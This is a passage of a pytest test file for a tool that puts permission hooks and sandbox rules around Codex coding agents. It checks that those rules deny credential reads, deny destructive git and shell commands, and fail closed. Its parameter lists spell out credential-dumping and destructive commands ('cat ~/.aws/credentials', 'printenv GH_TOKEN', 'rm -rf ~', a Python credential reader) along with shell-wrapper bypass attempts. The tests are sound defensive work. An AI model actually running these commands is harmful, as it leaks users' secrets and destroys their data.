                 marks=pytest.mark.variant("pre-tool hook must enforce policy on unprompted commands")),
    pytest.param("autonomous", 'python3 -c "$X"', "deny",
                 marks=pytest.mark.variant("pre-tool hook must enforce policy on unprompted commands")),
    pytest.param("autonomous", "git status; git log | head -1", None,
                 marks=pytest.mark.variant("every part allowed: no answer")),
    _sandboxed("env"),
    _sandboxed("printenv GH_TOKEN"),
    _sandboxed("cat ~/.aws/credentials"),
    _sandboxed("git reset --hard"),
    _sandboxed("git push --force"),
    _sandboxed("rm -rf ~"),
    pytest.param("standard", "sh -c 'env'", "deny", marks=pytest.mark.variant("bypass attempt")),
    pytest.param("standard", "bash -lc printenv", "deny", marks=pytest.mark.variant("bypass attempt")),
    pytest.param("standard", "cat $HOME/.npmrc", "deny", marks=pytest.mark.variant("bypass attempt")),
    pytest.param("standard", "python3 -c \"print(open(__import__('os').path.expanduser('~/.aws/credentials')).read())\"",
                 "deny", marks=pytest.mark.variant("bypass attempt")),
    pytest.param("standard", "git status; git reset --hard", "deny", marks=pytest.mark.variant("a part of a compound")),
    pytest.param("standard", "git status", None,
                 marks=pytest.mark.variant("pre-tool hook must enforce policy on unprompted commands")),
])
def test_codex_pre_tool_hook_denies_what_codex_runs_without_asking(db, ws, monkeypatch, preset, command, expected):
    """Codex runs a sandboxed command without asking, so its PermissionRequest
    hook never sees it: the launch passes a PreToolUse hook, run before every
    shell command, which answers brindle's denies."""
    import re

    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    turn_on(ws)
    permissions.apply_preset(preset)
    a = worker(db, ws)
    argv = launch_argv(ws)
    [flag] = [arg for arg in argv if arg.startswith("hooks.PreToolUse=")]
    assert argv[argv.index(flag) - 1] == "-c"
    assert re.search(flag.split('matcher="', 1)[1].split('"', 1)[0], "Bash")
    hook = hook_command_of(flag)
    assert codex_hook.status() == codex_hook.TRUSTED   # trusted with the PermissionRequest hook
    payload = {**codex_payload("Bash", {"command": command}, ws.path), "hook_event_name": "PreToolUse"}
    out = agents.hook_main(db, a.id, hook.rsplit(" ", 1)[1], json.dumps(payload), trusted=False)
    assert (json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else None) == expected


class SilentAppServer:
    """A `codex app-server` that doesn't answer (Codex missing or too old)."""
    def __init__(self, *args, **kwargs):
        raise codex_hook.CodexHookError("no codex")


@pytest.mark.parametrize("policy,layer,setting,server", [
    pytest.param("on", None, "", FakeAppServer,
                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
    pytest.param("off", "user", 'sandbox_mode = "workspace-write"\n', FakeAppServer,
                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
    # Codex would ignore brindle's profile (sandbox_mode wins), or run it with
    # full access: the launch is refused, naming the file to change.
    pytest.param("on", "user", 'sandbox_mode = "workspace-write"\n', FakeAppServer,
                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
    ("on", "project", 'sandbox_mode = "danger-full-access"\n', FakeAppServer),
    pytest.param("on", "system", 'sandbox_mode = "workspace-write"\n', FakeAppServer,
                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
    ("on", "user", 'default_permissions = ":danger-full-access"\n', FakeAppServer),
    ("on", "user", 'profile = "x"\n[profiles.x]\nsandbox_mode = "workspace-write"\n', FakeAppServer),
    # Codex can't list its layers (managed ones brindle can't read among
    # them): refused, however clean the files brindle can see are.
    ("on", None, "", SilentAppServer),
])
def test_codex_sandbox_denies_reading_credentials(ws, tmp_path, monkeypatch, policy, layer, setting, server):
    """With the policy on, Codex's own sandbox refuses every sandboxed command
    (and any shell typed into later) a read of each credential store, for
    this launch only, whatever the hooks see; the build caches stay writable.
    A config layer that would make Codex ignore that profile refuses the launch."""
    import tomllib

    from brindle import build_caches, providers
    from brindle.pro import credentials

    monkeypatch.setattr(codex_hook, "_AppServer", server)
    monkeypatch.setattr(FakeAppServer, "system_config", tmp_path / "etc-codex" / "config.toml")
    set_local(ws.repo_root, "permission_policy", policy)
    config = {"user": codex_hook.codex_home() / "config.toml", "project": Path(ws.path, ".codex", "config.toml"),
              "system": FakeAppServer.system_config}.get(layer)
    if config:
        config.parent.mkdir(parents=True, exist_ok=True)
        config.write_text(setting)
    if policy == "on" and (layer or server is SilentAppServer):
        with pytest.raises(providers.CodexSandboxRefused) as refused:
            launch_argv(ws)
        assert str(config or "config/read") in str(refused.value)
        return
    argv = launch_argv(ws)
    flags = dict(a.split("=", 1) for a in argv if a.startswith(("default_permissions=", "permissions.")))
    assert bool(flags) == (policy == "on")
    if policy == "off":
        [flag] = [a for a in argv if a.startswith("sandbox_workspace_write.writable_roots=")]
        assert_codex_sandbox_never_writes_git_hooks_or_config(json.loads(flag.split("=", 1)[1]), ws.path)
        return
    name = providers.CODEX_PROFILE
    assert json.loads(flags["default_permissions"]) == name
    assert json.loads(flags[f"permissions.{name}.extends"]) == ":workspace"
    table = tomllib.loads(f"t = {flags[f'permissions.{name}.filesystem']}")["t"]
    home = os.path.realpath(os.environ["BRINDLE_HOME"])
    for path in ("~/.aws", "~/.ssh", "~/.npmrc", "~/.git-credentials", "~/.docker/config.json", "~/.config/gh"):
        assert table[path] == "deny", path
    assert {os.path.realpath(p) for p, access in table.items() if access == "deny" and p.startswith("/")} >= {
        os.path.join(home, "daemon.json"), os.path.join(home, "brindle-keys"),
        os.path.realpath(credentials.FileStore().path.parent)}
    assert table[build_caches.uv_cache_dir()] == "write"
    assert_codex_sandbox_never_writes_git_hooks_or_config([p for p, a in table.items() if a == "write"], ws.path)


def assert_codex_sandbox_never_writes_git_hooks_or_config(roots, cwd, linked=True):
    """Of the common dir, exactly what a commit in linked worktree ``cwd`` writes: never hooks, config, info."""
    from brindle import git
    git_dir, common = (os.path.realpath(p) for p in git.out(
        ["rev-parse", "--path-format=absolute", "--git-dir", "--git-common-dir"], cwd).splitlines())
    want = {git_dir, *(os.path.join(common, d) for d in ("objects", "refs", "logs"))} if linked else set()
    assert common not in roots and {r for r in roots if r.startswith(common + os.sep)} == want


@pytest.mark.parametrize("event,chars,expected", [
    # Codex 0.162.1 asks before write_stdin (write_stdin_approval), and runs no
    # PreToolUse for it: a live shell (bash, bash -m, env -- bash, sh -c bash)
    # would run what's typed into it unchecked.
    ("codex-permission-request", "cat ~/.aws/credentials\n", "deny"),
    ("codex-pre-tool", "env\n", "deny"),       # should a Codex ever run PreToolUse for it
    pytest.param("codex-permission-request", "", None,
                 marks=pytest.mark.variant("hook must never relay terminal input for a Codex permission ask")),    # an empty poll types nothing
])
def test_codex_terminal_input_is_never_sent(db, ws, monkeypatch, event, chars, expected):
    monkeypatch.setattr(agents, "_hold_for_app", lambda *args, **kwargs: None)
    turn_on(ws)
    a = worker(db, ws)
    payload = {**codex_payload("write_stdin", {"session_id": 7, "chars": chars}, ws.path),
               "hook_event_name": "PreToolUse" if event == "codex-pre-tool" else "PermissionRequest"}
    out = agents.hook_main(db, a.id, event, json.dumps(payload))
    answer = json.loads(out)["hookSpecificOutput"] if out else {}
    decided = answer.get("permissionDecision") or (answer.get("decision") or {}).get("behavior")
    assert (decided if decided == "deny" else None) == expected


@pytest.mark.parametrize("broken,command,reason", [
    ("bookkeeping", "env", "would print credentials"),   # the policy's own deny still stands
    ("policy", "git status", permissions.CODEX_PRE_TOOL_UNCHECKED),
    ("agent", "git status", permissions.CODEX_PRE_TOOL_UNCHECKED),
    ("cli", "git status", permissions.CODEX_PRE_TOOL_UNCHECKED),
])
def test_codex_pre_tool_fails_closed(db, ws, monkeypatch, broken, command, reason):
    """Codex runs a call its PreToolUse hook gives no answer for, and nothing
    after it would stop a sandboxed one: a check that can't finish denies."""
    import sqlite3

    from brindle import prompt_answer

    turn_on(ws)
    a = worker(db, ws)
    if broken == "bookkeeping":
        def locked(*args, **kwargs):
            raise sqlite3.OperationalError("database is locked")
        monkeypatch.setattr(prompt_answer, "settled", locked)
    if broken == "policy":
        def unreadable(*args, **kwargs):
            raise RuntimeError("profile unreadable")
        monkeypatch.setattr("brindle.profiles.profile_rules_for", unreadable)
    payload = json.dumps({**codex_payload("Bash", {"command": command}, ws.path), "hook_event_name": "PreToolUse"})
    if broken == "cli":
        monkeypatch.delenv("BRINDLE_AGENT_ID", raising=False)
        monkeypatch.setattr(antigravity, "agent_from_parent", lambda: None)
        out = CliRunner().invoke(app, ["_hook", "codex-pre-tool"], input=payload).output
    else:
        out = agents.hook_main(db, "gone" if broken == "agent" else a.id, "codex-pre-tool", payload)
    answer = json.loads(out)["hookSpecificOutput"]
    assert answer["permissionDecision"] == "deny" and reason in answer["permissionDecisionReason"]


@pytest.mark.variant("live incident #239: upgrading 0.4.1 to 0.4.2 left the old trust, and a Codex reviewer stopped at Hooks need review")
def test_reviewer_launch_retrusts_a_hook_trusted_by_another_build(ws, monkeypatch):
    """#239: the trust on record was for the same command with another timeout
    (a build with the day-long hold), and the upgraded build's hook has the
    old 30s one. Codex's hash covers the whole definition, so the hook it saw
    was new, while brindle, comparing commands only, called it trusted and
    passed it into 'Hooks need review'. (A changed command was already
    re-trusted.) It's renewed before a reviewer starts now."""
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    turn_on(ws)
    monkeypatch.setattr(codex_hook, "TIMEOUT", 86430)
    codex_hook.trust("codex", codex_hook.inspect("codex"))  # the other build's trust
    with permissions.editing() as store:  # in the record format from before the definition was kept
        store.codex_hook = {home: {k: rec[k] for k in ("command", "key", "hash")}
                            for home, rec in store.codex_hook.items()}
    monkeypatch.setattr(codex_hook, "TIMEOUT", 30)
    flag = codex_hook.config_flags()[1]
    assert flag in launch_argv(ws, mode="review")
    assert codex_hook.inspect("codex").status == "trusted"  # what Codex launches with
    turn_off_in_codex()
    FakeAppServer.calls = []
    assert flag not in launch_argv(ws, mode="review")
    # Not asked to trust it again (config/read is the sandbox check's).
    assert [m for m, _ in FakeAppServer.calls if m != "config/read"] == [] and codex_hook.status() == codex_hook.REMOVED


def test_unverifiable_trust_is_reported_not_called_trusted(db, ws, monkeypatch):
    """Codex says the hook is untrusted and refuses the re-trust: the reviewer
    starts without the hook, so the record must stop saying TRUSTED (the
    warning and the supervisor's notice read it)."""
    class RefusingCodex(FakeAppServer):
        def __init__(self, binary, flags):
            super().__init__(binary, [flags[0], flags[1] + "#build2", *flags[2:]])

        def call(self, method, params):
            if method == "config/batchWrite":
                raise codex_hook.CodexHookError("read-only config")
            return super().call(method, params)

    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    turn_on(ws)
    codex_hook.trust("codex", codex_hook.inspect("codex"))
    monkeypatch.setattr(codex_hook, "_AppServer", RefusingCodex)
    db.add_agent(Agent("boss", ws.id, "supervisor", "claude", None, "interactive", "idle", "", None, time.time()))
    reviewer = worker(db, ws, id_="r1")
    assert codex_hook.launch_flags(ws.path, review=True) == []
    assert codex_hook.status() == codex_hook.MOVED
    assert codex_hook.launch_warning("codex", ws.path)
    assert codex_hook.tell_untrusted(db, reviewer, ws.path)


def test_trust_written_but_not_verified_is_pending_not_removed(db, ws, monkeypatch):
    """The write to Codex's config lands, then asking Codex fails: the config
    holds a hash the record doesn't, which read as the person removing the trust
    (never retried, supervisor not told). It's pending now, and the next launch recovers."""
    class SilentAfterWrite(FakeAppServer):
        wrote = False

        def call(self, method, params):
            if SilentAfterWrite.wrote and method == "hooks/list":
                raise codex_hook.CodexHookError("codex app-server didn't answer")
            out = super().call(method, params)
            SilentAfterWrite.wrote |= method == "config/batchWrite"
            return out

    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    turn_on(ws)
    codex_hook.trust("codex", codex_hook.inspect("codex"))
    move_brindle(monkeypatch)  # a new hook: re-trusting writes a new hash
    db.add_agent(Agent("boss", ws.id, "supervisor", "claude", None, "interactive", "idle", "", None, time.time()))
    reviewer = worker(db, ws, id_="r1")
    monkeypatch.setattr(codex_hook, "_AppServer", SilentAfterWrite)
    assert codex_hook.launch_flags(ws.path) == []
    assert codex_hook.status() == codex_hook.MOVED
    assert codex_hook.tell_untrusted(db, reviewer, ws.path)
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)  # Codex answers again
    assert codex_hook.config_flags(codex_hook.hook_command())[1] in codex_hook.launch_flags(ws.path)
    assert codex_hook.status() == codex_hook.TRUSTED


def test_every_brindle_process_names_the_hook_the_same(tmp_path, monkeypatch):
    """Live: the app ran `<tool venv>/bin/python -P -m brindle`, a shell the
    `brindle` shim; Codex has one trusted hash for the hook, so each process's
    trust replaced the other's and the next launch stopped at 'Hooks need review'."""
    venv = tmp_path / "tool" / "bin"
    venv.mkdir(parents=True)
    script = venv / "brindle"
    script.write_text("#!/bin/sh\n")
    script.chmod(0o755)
    shim = tmp_path / "local-bin"
    shim.mkdir()
    (shim / "brindle").symlink_to(script)
    py = venv / "python"
    py.write_text("")
    monkeypatch.setattr("brindle.providers.brindle_invocation", lambda: [str(py), "-P", "-m", "brindle"])
    from_app = codex_hook.hook_command()
    monkeypatch.setattr("brindle.providers.brindle_invocation", lambda: [str(shim / "brindle")])
    assert codex_hook.hook_command() == from_app
    assert str(script.resolve()) in (brindle_home() / "bin" / "codex-hook").read_text()


def test_installs_at_different_paths_share_one_hook_definition(tmp_path, monkeypatch):
    """Live: the /Applications app, one run from a mounted disk image and a uv
    CLI each named their own binary in the hook, so each re-trusted over the others."""
    def install(name):
        exe = tmp_path / name / "bin" / "brindle"
        exe.parent.mkdir(parents=True)
        exe.write_text(f"#!/bin/sh\necho {name}\n")
        exe.chmod(0o755)
        monkeypatch.setattr("brindle.providers.brindle_invocation", lambda: [str(exe)])
        return codex_hook.definition(), exe

    def run_hook():
        import subprocess
        return subprocess.run([str(brindle_home() / "bin" / "codex-hook")], capture_output=True, text=True).stdout.strip()

    import threading

    first, first_exe = install("app")
    second, second_exe = install("dmg")
    assert first == second
    assert str(first_exe) not in second

    # Two installs register at the same moment: the dmg's writer has read the
    # launcher and is about to replace it when the app's whole update runs.
    # Unlocked, the dmg's write drops the app; locked, the app waits its turn.
    (brindle_home() / "bin" / "codex-hook").unlink()
    import fcntl

    dmg_has_read, app_met_the_dmg = threading.Event(), threading.Event()
    advanced = []
    real_mkstemp, real_flock = codex_hook.tempfile.mkstemp, fcntl.flock

    def mkstemp_after_read(*args, **kwargs):
        if threading.current_thread().name == "dmg":
            dmg_has_read.set()
            # Released only by the app writer's own progress (below); the limit is a failure guard.
            advanced.append(app_met_the_dmg.wait(30))
        return real_mkstemp(*args, **kwargs)

    def flock_probing_contention(fd, op):
        if threading.current_thread().name == "app" and op == fcntl.LOCK_EX:
            try:
                return real_flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
            except BlockingIOError:   # the real lock is held by the dmg writer
                app_met_the_dmg.set()
        return real_flock(fd, op)

    def app_registers():
        dmg_has_read.wait()
        codex_hook._launcher([str(first_exe)])
        app_met_the_dmg.set()   # without a lock it completed its whole update instead

    monkeypatch.setattr(codex_hook.tempfile, "mkstemp", mkstemp_after_read)
    monkeypatch.setattr(fcntl, "flock", flock_probing_contention)
    writers = [threading.Thread(target=codex_hook._launcher, args=([str(second_exe)],), name="dmg"),
               threading.Thread(target=app_registers, name="app")]
    for w in writers:
        w.start()
    for w in writers:
        w.join()
    assert advanced == [True]
    second_exe.unlink()   # the disk image is ejected: the app's running sessions still work
    assert run_hook() == "app"


@pytest.mark.parametrize("bundled", [True, False])
@pytest.mark.variant("nightly 42656843590: shell execution and its outside-engine bypass are invisible to Python coverage")
def test_bundle_smoke_runs_codex_launcher(tmp_path, monkeypatch, bundled):
    import shlex
    from brindle import spawn

    engine = tmp_path / "An App.app" / "engine"
    bin_dir = engine / "python" / "bin"
    bin_dir.mkdir(parents=True)
    exe = (bin_dir if bundled else tmp_path) / "brindle"
    exe.write_text('#!/bin/sh\ncase "$1" in --version) echo "brindle 0.6.3";; _hook) exit 0;; *) exit 1;; esac\n')
    exe.chmod(0o755)
    monkeypatch.setenv("BRINDLE_HOME", str(tmp_path / "home" / "brindle"))
    monkeypatch.setattr(codex_hook, "_stable_invocation", lambda: [str(exe)])
    command = codex_hook.hook_command()
    python = bin_dir / "python3"
    python.write_text("#!/bin/sh\nprintf '%s\\n' " + shlex.quote(command) + "\n")
    python.chmod(0o755)
    smoke = (Path(__file__).parents[1] / "app/scripts/smoke_bundle.sh").read_text()
    block = smoke.split("check_codex_hook() {\n", 1)[1].split("\n}\n", 1)[0]
    setup = '''
set -eu
FAILED=0
VERSION=0.6.3
pass() { :; }
fail() { echo "$*"; FAILED=1; }
check_version() { [ "$2" = "brindle $VERSION" ] || fail version; }
engine_home() { :; }
isolated() { local home="$1"; shift; env -i HOME="$home" BRINDLE_HOME="$home/brindle" "$@"; }
'''
    result = spawn.action(["bash", "-c", setup + "check_codex_hook() {\n" + block +
                           '\n}\ncheck_codex_hook\nexit "$FAILED"'], env={
        "ENGINE_DIR": str(engine), "ENGINE_HOME": str(tmp_path / "home"), "PATH": "/usr/bin:/bin"})
    assert result.returncode == (0 if bundled else 1), result.stdout + result.stderr


def test_codex_hook_ignores_a_relocated_console_scripts_missing_interpreter(tmp_path, monkeypatch):
    bin_dir = tmp_path / "engine" / "python" / "bin"
    bin_dir.mkdir(parents=True)
    script = bin_dir / "brindle"
    script.write_text(f"#!{tmp_path}/ci-build/python3\n")
    script.chmod(0o755)
    py = bin_dir / "python"
    py.write_text("")
    (bin_dir / "python3").symlink_to(py)
    monkeypatch.setattr("brindle.providers.brindle_invocation",
                        lambda: [str(bin_dir / "python3"), "-P", "-m", "brindle"])
    assert codex_hook._stable_invocation() == [str(py), "-P", "-m", "brindle"]
    monkeypatch.setattr("brindle.providers.brindle_invocation", lambda: [str(script)])
    assert codex_hook._stable_invocation() == [str(py), "-P", "-m", "brindle"]


def test_codex_hook_trust_is_per_codex_home(ws, monkeypatch, tmp_path):
    """Live: brindle's own Codex home (provider_homes) came into use while the
    one trust on record (an older brindle's, a single record) was ~/.codex's.
    Read against brindle's home, which has none, it was REMOVED, never trusted
    again, and the inbox asked to fix it every time."""
    from brindle import provider_homes

    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    codex_hook.trust("codex", codex_hook.inspect("codex"))   # in the person's own home
    store = permissions.store_path()
    data = json.loads(store.read_text())
    [own] = data["codex_hook"].values()
    store.write_text(json.dumps({**data, "codex_hook": own}))   # the older brindle's single record
    mine = tmp_path / "brindle-codex"
    mine.mkdir()
    (mine / provider_homes.SIGNED_IN).write_text("1\n")
    monkeypatch.setenv("BRINDLE_CODEX_CONFIG_HOME", str(mine))
    assert codex_hook.codex_home() == mine
    assert codex_hook.status() == codex_hook.NEW
    assert codex_hook.ensure("codex") == codex_hook.TRUSTED
    assert codex_hook.status() == codex_hook.TRUSTED
    assert "trusted_hash" in (mine / "config.toml").read_text()
    assert permissions.load_store().codex_hook[os.path.realpath(os.environ["CODEX_HOME"])] == own
    turn_off_in_codex()   # in brindle's home
    FakeAppServer.calls = []
    assert codex_hook.ensure("codex") == codex_hook.REMOVED and FakeAppServer.calls == []


@pytest.mark.parametrize("fallback", [False, True])
def test_supervisor_is_told_once_when_brindle_cant_trust_its_hook(db, ws, monkeypatch, fallback):
    if not fallback:
        turn_on(ws)  # no Codex answers here, so the hook stays untrusted
        db.add_agent(Agent("boss", ws.id, "supervisor", "claude", None, "interactive", "idle", "", None, time.time()))
        reviewer = worker(db, ws, id_="r1")
        assert codex_hook.launch_flags(ws.path) == []
        assert codex_hook.tell_untrusted(db, reviewer, ws.path)
        assert not codex_hook.tell_untrusted(db, reviewer, ws.path)
        assert db.conn.execute("SELECT COUNT(*) FROM inbox WHERE agent_id='boss'").fetchone()[0] == 1
        return

    from brindle import providers
    from brindle.config import POLICY_DEFAULT_KEY, set_user
    from brindle.profiles import load_profile
    from brindle.providers import Codex, LaunchContext

    # Default-on policy falls back to Codex's approvals; an explicit choice still refuses.
    set_user(POLICY_DEFAULT_KEY, "on")
    monkeypatch.setattr(providers, "_codex_layers",
                        lambda cwd: [("/codex/config.toml", {"sandbox_mode": "workspace-write"})])
    monkeypatch.setattr(codex_hook, "ensure", lambda **_: codex_hook.TRUSTED)
    agent = Agent("s1", ws.id, "developer", "codex", None, "interactive", "processing", "@0", None, time.time())
    db.add_agent(agent)

    def launch():
        argv = Codex().command(LaunchContext(agent.id, load_profile("developer"), None, cwd=ws.path))
        assert not [a for a in argv if a.startswith(("default_permissions=", "permissions.", "hooks."))]
        return codex_hook.tell_skipped(db, agent, ws.path)

    assert launch() and not launch()
    assert db.conn.execute("SELECT count(*) FROM inbox WHERE agent_id='s1'").fetchone()[0] == 1
    assert codex_hook.launch_warning("codex", ws.path) is None

    monkeypatch.setattr(providers, "_codex_layers", lambda cwd: [])
    monkeypatch.setattr(codex_hook, "ensure", lambda **_: codex_hook.NEW)
    argv = Codex().command(LaunchContext(agent.id, load_profile("developer"), None, cwd=ws.path))
    assert not [a for a in argv if a.startswith("hooks.")]
    assert codex_hook.tell_untrusted(db, agent, ws.path) and not codex_hook.tell_untrusted(db, agent, ws.path)
    assert db.conn.execute("SELECT count(*) FROM inbox WHERE agent_id='s1' AND instr(body, ?) > 0",
                           (codex_hook.UNTRUSTED,)).fetchone()[0] == 1

    monkeypatch.setattr(providers, "_codex_layers",
                        lambda cwd: [("/codex/config.toml", {"sandbox_mode": "workspace-write"})])
    set_user("permission_policy", "on")
    with pytest.raises(providers.CodexSandboxRefused):
        Codex().command(LaunchContext(agent.id, load_profile("developer"), None, cwd=ws.path))


def test_unreadable_codex_trust_never_gets_reinstalled(ws, monkeypatch):
    config = "not valid TOML"
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    turn_on(ws)
    codex_hook.trust("codex", codex_hook.inspect("codex"))
    (codex_hook.codex_home() / "config.toml").write_text(config)
    FakeAppServer.calls = []
    move_brindle(monkeypatch)
    assert codex_hook.launch_flags(ws.path) == []
    assert FakeAppServer.calls == []
    assert (codex_hook.codex_home() / "config.toml").read_text() == config
    # Not a removal, and nothing the Inbox's fix could repair: the warning and doctor say what it is.
    from brindle import doctor
    from brindle.service import inbox

    monkeypatch.setattr("brindle.providers.codex_binary", lambda: "/bin/sh")
    assert codex_hook.status() == codex_hook.UNREADABLE and inbox._setup_items() == []
    assert codex_hook.launch_warning("codex", ws.path)
    assert doctor.codex_hook_checks(ws.repo_root)[0].level == doctor.WARN


def move_brindle(monkeypatch):
    """A reinstall: brindle's interpreter elsewhere, so a new hook command."""
    monkeypatch.setattr(codex_hook, "_launcher",
                        lambda: ["/new/venv/bin/python", "-m", "brindle"])


def turn_off_in_codex():
    """What Codex's own switch writes: ``enabled = false`` on the hook's entry."""
    config = codex_hook.codex_home() / "config.toml"
    config.write_text(config.read_text() + "enabled = false\n")


def _update_changes_the_hook(monkeypatch):
    monkeypatch.setattr(codex_hook, "TIMEOUT", codex_hook.TIMEOUT + 1)


def _another_install_took_the_slot(monkeypatch):
    config = codex_hook.codex_home() / "config.toml"
    rec = next(iter(permissions.load_store().codex_hook.values()))
    config.write_text(config.read_text().replace(rec["hash"], "sha256:another-install"))


def _a_rewrite_lost_the_entries(monkeypatch):
    (codex_hook.codex_home() / "config.toml").write_text('model = "x"\n')


def _a_launchs_check_failed_on_a_busy_machine(monkeypatch):
    codex_hook._forget_definition()


def _forget_the_trust():
    with permissions.editing() as store:
        store.codex_hook = {}


def _never_trusted_with_the_persons_policy_on(monkeypatch):
    _forget_the_trust()
    (brindle_home() / "config.json").write_text(json.dumps({"permission_policy": "on"}))


@pytest.fixture
def hook_daemon(ws, monkeypatch):
    """This process as the daemon of this brindle home, with Codex installed and its hook trusted."""
    from brindle.daemon import lifecycle

    monkeypatch.setattr("brindle.providers.codex_binary", lambda: "/bin/sh")
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    monkeypatch.setattr(codex_hook, "_failed_at", {}, raising=False)
    lifecycle.info_path().parent.mkdir(parents=True, exist_ok=True)
    lifecycle.info_path().write_text(json.dumps({"pid": os.getpid()}))
    codex_hook.trust("codex", codex_hook.inspect("codex"))
    FakeAppServer.calls = []
    return lifecycle


def _setup_items(db, ws):
    from brindle.service import inbox

    return [i for i in inbox.items(db, str(ws.repo_root), panes={}) if i.kind == "setup"]


@pytest.mark.parametrize("left_trusted", [
    _update_changes_the_hook,
    _another_install_took_the_slot,
    _never_trusted_with_the_persons_policy_on,
    pytest.param(_a_rewrite_lost_the_entries, marks=pytest.mark.variant("a lost entry used to read as a person's removal")),
    pytest.param(_a_launchs_check_failed_on_a_busy_machine, marks=pytest.mark.variant("live: a launch under load read as a changed config")),
])
@pytest.mark.variant("real incident: the Inbox asked to fix the hook's trust twice on one daemon, with no change a person made")
def test_the_daemon_keeps_the_hook_trusted_and_the_inbox_never_asks(db, ws, hook_daemon, monkeypatch, left_trusted):
    """Live, 0.6.0: the Inbox asked to fix the trust at 18:26 and again at 18:39,
    with no change a person made. Whatever took it out of TRUSTED is brindle's
    to put right, with no Codex launch and nothing shown."""
    left_trusted(monkeypatch)
    assert codex_hook.status() != codex_hook.TRUSTED
    assert _setup_items(db, ws) == []
    hook_daemon._keep_codex_hook()
    assert codex_hook.status() == codex_hook.TRUSTED
    assert codex_hook.inspect("codex").status == "trusted"   # what the next Codex launch sees
    assert _setup_items(db, ws) == []


def test_the_daemons_watch_puts_back_a_trust_lost_while_it_runs(ws, hook_daemon, monkeypatch):
    from types import SimpleNamespace

    from brindle.daemon import session_review
    from brindle.upgrade import InstallWatch

    monkeypatch.setattr(session_review.ReadinessWatch, "sweep_safely", lambda self: None)
    monkeypatch.setattr(InstallWatch, "changed", lambda self: False)
    _a_rewrite_lost_the_entries(monkeypatch)
    old = time.time() - hook_daemon.CODEX_HOOK_SETTLE - 1
    os.utime(codex_hook.codex_home() / "config.toml", (old, old))
    now = [0.0]
    server = SimpleNamespace(should_exit=False)

    async def elapse(seconds):
        now[0] += hook_daemon.CODEX_HOOK_EVERY
        server.should_exit = True

    asyncio.run(hook_daemon._watch(server, None, False, wait=elapse, clock=lambda: now[0]))
    assert codex_hook.status() == codex_hook.TRUSTED


def _codex_just_refused_it(mp, lifecycle):
    class Refusing(FakeAppServer):
        def call(self, method, params):
            raise codex_hook.CodexHookError("too old")

    mp.setattr(codex_hook, "_AppServer", Refusing)
    lifecycle._keep_codex_hook()
    mp.setattr(codex_hook, "_AppServer", FakeAppServer)


@pytest.mark.parametrize("why_left_alone", [
    pytest.param(lambda mp, lc: lc.info_path().write_text(json.dumps({"pid": os.getpid() + 1})), id="not this home's daemon"),
    pytest.param(lambda mp, lc: mp.delenv("BRINDLE_CODEX_CONFIG_HOME"), id="throwaway brindle home"),
    pytest.param(lambda mp, lc: mp.setattr("brindle.providers.codex_binary", lambda: "/nonexistent/codex"), id="no Codex"),
    pytest.param(lambda mp, lc: _forget_the_trust(), id="new, the person's policy off",
                 marks=pytest.mark.variant("daemon must respect the person disabling hook trust")),
    pytest.param(lambda mp, lc: _another_install_took_the_slot(mp) or lc.CODEX_HOOK_SETTLE, id="another install's Codex may be starting"),
    pytest.param(_codex_just_refused_it, id="Codex just refused it"),
    pytest.param(lambda mp, lc: turn_off_in_codex(), id="the person turned it off",
                 marks=pytest.mark.variant("daemon must respect the person disabling hook trust")),
])
def test_the_daemon_doesnt_take_the_hooks_slot_when_its_not_its_to_take(ws, hook_daemon, monkeypatch, why_left_alone):
    """Two installs' daemons, or a throwaway home's, would each read the other's
    trust as MOVED and write over it for ever; this machine had two running."""
    _update_changes_the_hook(monkeypatch)
    settle = why_left_alone(monkeypatch, hook_daemon)
    settle = settle if isinstance(settle, float) else 0.0
    before = codex_hook.status()
    FakeAppServer.calls = []
    hook_daemon._keep_codex_hook(settle)
    assert FakeAppServer.calls == [] and codex_hook.status() == before != codex_hook.TRUSTED


def test_a_hook_the_person_turned_off_is_asked_about_and_comes_back_only_when_they_ask(db, ws, hook_daemon, monkeypatch):
    import tomllib

    def enabled():
        state = tomllib.loads((codex_hook.codex_home() / "config.toml").read_text())["hooks"]["state"]
        return [entry.get("enabled") for entry in state.values() if "enabled" in entry]

    turn_off_in_codex()
    [item] = _setup_items(db, ws)
    assert item.fix == "codex_hook_trust" and item.action.path == "/v1/setup/codex-hook"
    # brindle's record gone (a reset store, another BRINDLE_HOME on this Codex home), the policy on:
    # nothing automatic may read that as a new hook and turn it back on.
    _never_trusted_with_the_persons_policy_on(monkeypatch)
    assert codex_hook.status() == codex_hook.REMOVED
    FakeAppServer.calls = []
    hook_daemon._keep_codex_hook()
    assert codex_hook.ensure("codex") == codex_hook.REMOVED
    assert FakeAppServer.calls == [] and enabled() == [False]
    # Nor a trust() started before it was turned off, which reads the keys Codex listed under the lock.
    with pytest.raises(codex_hook.HookTurnedOff):
        codex_hook.trust("codex", codex_hook.inspect("codex"))
    assert enabled() == [False]
    assert CliRunner().invoke(app, ["permissions", "install-codex-hook", "--yes"]).exit_code == 0   # they ask
    assert enabled() == [True] and codex_hook.status() == codex_hook.TRUSTED


@pytest.mark.variant("a race: a hook trust written during a project trust's rewrite of config.toml was lost")
def test_a_hook_trust_cant_land_inside_a_project_trusts_rewrite(ws, monkeypatch):
    """trust_codex_project rewrites config.toml from text it read under this lock:
    a hook trust written in between was lost, and read as a person removing it."""
    import fcntl

    (brindle_home() / "locks").mkdir(parents=True, exist_ok=True)

    class Checking(FakeAppServer):
        def call(self, method, params):
            if method == "config/batchWrite":
                with open(brindle_home() / "locks" / "codex-trust.lock", "a+") as lock:
                    with pytest.raises(BlockingIOError):
                        fcntl.flock(lock.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            return super().call(method, params)

    monkeypatch.setattr(codex_hook, "_AppServer", Checking)
    assert codex_hook.trust("codex", codex_hook.inspect("codex")).status == "trusted"


